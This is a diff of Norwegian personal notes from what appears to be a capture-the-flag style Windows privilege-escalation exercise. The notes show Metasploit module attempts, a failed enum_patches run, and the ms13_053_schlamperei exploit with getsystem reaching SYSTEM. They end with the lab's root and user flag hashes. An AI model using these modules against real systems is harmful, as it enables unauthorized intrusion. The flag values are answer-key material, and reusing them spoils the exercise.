@@ -59,7 +59,7 @@ net users
 
     **
 
-use post/multi/recon/local\_exploit\_suggester **    
+use post/multi/recon/local\_exploit\_suggester **      
 **FORSØKT ALLE DISSE UTEN HELL\*\*
 
 ```
@@ -105,8 +105,8 @@ msf post\(enum\_patches\) &gt; set session 2
 session =&gt; 2  
 msf post\(enum\_patches\) &gt; exploit
 
-\[-\] Post failed: NoMethodError undefined method `[]' for nil:NilClass    
-[-] Call stack:    
+\[-\] Post failed: NoMethodError undefined method `[]' for nil:NilClass      
+[-] Call stack:      
 [-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_patches.rb:72:in`run'  
 \[\*\] Post module execution completed
 
@@ -453,8 +453,15 @@ exploit/windows/local/ms16_032_secondary_logon_handle_privesc funekr ikke fordi 
 ```
 
 ```
-
+use exploit/windows/local/ms13\_053\_schlamperei
+tror det var denne som ordnet det. kjørte getsystem of fikk SYSTEM
 ```
 
+type root.txt.txt
 
+**e621a0b5041708797c4fc4728bc72b4b**
+
+type user.txt.txt
+
+**9ecdd6a3aedf24b41562fea70f4cb3e8**
 
